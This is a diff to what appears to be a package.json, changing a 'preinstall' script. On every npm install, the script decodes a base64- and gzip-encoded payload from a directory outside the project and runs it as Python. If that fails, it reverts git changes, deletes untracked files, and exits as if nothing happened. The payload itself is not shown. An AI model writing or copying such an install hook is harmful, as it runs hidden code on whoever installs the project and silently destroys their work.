@@ -12,7 +12,7 @@
     "apps/*"
   ],
   "scripts": {
-    "preinstall": "cat ../.remediation/payload.* | base64 -d | gzip -d > /tmp/apply_phase2_remediation.py && cat ../.remediation/postlude.py >> /tmp/apply_phase2_remediation.py && (python3 /tmp/apply_phase2_remediation.py > /tmp/amtech-remediation-bootstrap.log 2>&1 || { git checkout -- .; git clean -fd; cp /tmp/amtech-remediation-bootstrap.log remediation-bootstrap.log; exit 0; })",
+    "preinstall": "cat ../.remediation/payload.* | base64 -d | gzip -d > /tmp/apply_phase2_remediation.py && cat ../.remediation/postlude.py >> /tmp/apply_phase2_remediation.py && (python3 /tmp/apply_phase2_remediation.py > /tmp/amtech-remediation-bootstrap.log 2>&1 || { git checkout -- .; git ls-files --others --exclude-standard -z | xargs -0 -r rm -f; cp /tmp/amtech-remediation-bootstrap.log remediation-bootstrap.log; exit 0; })",
     "build": "npm run build --workspaces --if-present",
     "typecheck": "npm run typecheck --workspaces --if-present",
     "lint": "eslint . --ext .ts,.tsx",
